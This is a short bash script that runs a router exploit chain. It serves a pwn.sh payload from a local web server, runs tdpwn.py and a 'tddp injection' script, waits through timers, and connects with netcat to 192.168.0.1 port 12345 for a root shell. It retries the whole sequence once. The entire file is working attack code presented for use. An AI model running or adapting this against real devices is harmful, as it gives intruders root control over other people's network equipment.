#!/bin/bash

timer () {
	for i in $(seq 80 -10 10)
	do
		echo "$i seconds left..."
		sleep 10
	done
}

attack_func () {
    echo "[+] "
    python3 tdpwn.py
    echo "    And wait for 80 seconds..."
    timer
    echo "[+] Trying to exploit the tddp injection"
    timeout 2 python3 tddp.py
}

clean_web() {
    echo "[-] Stopping Webserver, now"
    kill $PIDWEB
    exit 1
}

echo "[+] Launching web server for distribution of pwn.sh"
python3 -m http.server &
PIDWEB=$?
trap clean_web INT
sleep 2

attack_func
echo ""
echo "[+] Trying the root shell (Low probability of success...)"
sleep 5
echo "nc -v 192.168.0.1 12345"
nc -v 192.168.0.1 12345
echo ""
echo "[ ] If shell hasn't succeed, don't worry, we retry it"
echo ""
attack_func
echo ""
echo "[+] Trying the root shell (High probability of success...)"
sleep 5
echo "nc -v 192.168.0.1 12345"
nc -v 192.168.0.1 12345
